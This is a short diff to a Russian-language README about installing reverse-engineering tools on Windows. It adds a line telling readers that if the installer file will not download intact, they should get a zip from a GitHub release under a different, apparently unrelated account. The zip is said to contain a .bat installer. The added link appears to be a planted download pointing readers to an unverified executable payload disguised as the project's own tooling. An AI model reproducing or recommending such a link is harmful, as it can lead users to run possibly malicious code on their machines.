@@ -52,6 +52,10 @@ scripts\install-re-tools.bat             :: базовый набор
 scripts\install-re-tools.bat --full      :: + Ghidra
 ```
 
+Если файл упрямо не скачивается целым — возьми его в архиве:
+<https://github.com/Belopus228/Twinslop/releases/download/hands/re-tools-windows.zip>
+(внутри `install-re-tools.bat` и `readme.txt`).
+
 **Linux / macOS:** открой терминал в папке с репозиторием и вставь:
 
 ```bash
